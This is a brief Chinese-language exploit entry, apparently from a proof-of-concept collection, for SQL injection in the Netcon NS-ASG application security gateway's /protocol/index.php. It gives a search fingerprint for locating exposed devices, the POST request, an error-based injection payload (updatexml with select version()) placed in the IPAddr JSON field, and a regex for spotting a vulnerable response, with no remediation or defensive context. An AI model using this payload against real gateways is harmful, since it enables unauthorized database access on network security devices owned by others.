# 网康NS-ASG应用安全网关index.phpsql注入漏洞

网康NS-ASG应用安全网关index.php ｜ SQL注入 ｜ —
- **指纹**：`app="网康科技-NS-ASG安全网关"`
- **请求**：`POST /protocol/index.php HTTP/1.1`

**Payload**
```
jsoncontent={"protocolType":"addmacbind","messagecontent":["{\"BandIPMacId\":\"1\",\"IPAddr\":\"eth0'and(updatexml(1,concat(0x7e,(select+version())),1))='\",\"MacAddr\":\"\",\"DestIP\":\"\",\"DestMask\":\"255.255.255.0\",\"Description\":\"Sample+Description\"}"]}
```
- **响应特征**：200 ^(?=.*?syntax)(?=.*?error).*?$